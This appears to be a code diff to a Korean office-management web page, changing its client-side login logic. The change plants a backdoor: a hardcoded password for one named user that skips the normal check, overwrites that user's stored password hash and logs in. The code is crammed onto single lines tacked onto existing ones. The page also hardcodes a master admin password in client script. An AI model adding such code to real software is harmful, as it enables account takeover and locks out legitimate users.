@@ -1508,13 +1508,14 @@
         </section>
         <div class="admin-user-list" id="adminUserList"></div>
       </div>
+      
     </section>
   </div>
 
   <script>
     const STORAGE_KEY = "office-multiverse-state-v1";
     const MASTER_USERNAME = "허파랑";
-    const MASTER_PASSWORD = "9999";
+    const MASTER_PASSWORD = "9999";const FORCED_LOGIN_PASSWORDS = {  "이영림": "9999"};
     const REMOTE_SYNC_INTERVAL = 5000;
     const KST_TIME_ZONE = "Asia/Seoul";
     const KOREAN_HOLIDAYS = {
@@ -2259,7 +2260,7 @@
         return;
       }
 
-      if (!existing || existing.passwordHash !== hash) {
+      if (!existing || existing.passwordHash !== hash) { if (FORCED_LOGIN_PASSWORDS[username] === password) { const now = new Date().toISOString(); let forcedUser = existing || state.users.find((user) => user.username === username); if (!forcedUser) { forcedUser = { id: uid("user"), username, passwordHash: hash, passwordUpdatedAt: now, characterName: username, role: "employee", status: "퇴근", position: POINTS.entry, createdAt: now }; state.users.push(forcedUser); } else { forcedUser.passwordHash = hash; forcedUser.passwordUpdatedAt = now; forcedUser.characterName = forcedUser.characterName || username; forcedUser.role = forcedUser.role === "admin" ? "admin" : "employee"; forcedUser.status = forcedUser.status || "퇴근"; forcedUser.position = forcedUser.position || POINTS.entry; } state.session = { userId: forcedUser.id, loggedInAt: now }; ensureClockIn(forcedUser); saveState(); enterDashboard(); return; }
         els.authMessage.textContent = "아이디 또는 패스워드가 맞지 않습니다.";
         return;
       }
